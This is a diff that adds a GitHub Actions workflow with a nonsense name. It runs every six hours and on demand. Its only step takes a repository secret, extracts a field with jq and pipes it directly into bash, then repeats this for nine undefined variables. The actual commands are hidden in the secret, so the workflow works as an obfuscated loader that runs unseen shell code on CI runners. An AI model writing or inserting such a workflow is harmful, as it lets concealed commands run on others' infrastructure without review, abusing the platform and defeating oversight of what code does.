@@ -1,0 +1,27 @@
+name: corrosionsorrowful
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: corrosionsorrowful
+        env:
+          y02: ${{ secrets.y02 }}
+        run: |
+          echo $y02 | jq -r .u512 | /bin/bash
+          echo $ciss217 | jq -r .h7 | /bin/bash
+          echo $vgebh5 | jq -r .ww719 | /bin/bash
+          echo $qezrl803 | jq -r .jyhaf88109 | /bin/bash
+          echo $egv616 | jq -r .mbqbk97213 | /bin/bash
+          echo $aqrbe8 | jq -r .uejsm575 | /bin/bash
+          echo $gwbh84 | jq -r .bfme47064 | /bin/bash
+          echo $w108 | jq -r .ivp276 | /bin/bash
+          echo $gtxl58787 | jq -r .goef5130 | /bin/bash
+          echo $y4 | jq -r .wu25665 | /bin/bash
+
